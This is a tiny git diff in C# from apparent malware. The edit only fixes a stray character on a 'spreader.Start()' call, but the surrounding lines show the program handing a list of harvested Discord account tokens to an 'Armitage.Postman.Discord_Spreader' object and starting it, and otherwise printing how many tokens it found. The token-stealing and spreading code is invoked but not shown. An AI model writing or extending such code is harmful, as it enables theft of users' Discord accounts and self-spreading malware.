@@ -113,7 +113,7 @@ namespace Client
             {
                 Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.Select(x => x.Item2).ToArray());
              
-                spreader.Start();S
+                spreader.Start();
             }
             else { Console.WriteLine("found tokens : " + discord_tokens.Count.ToString()); }
 
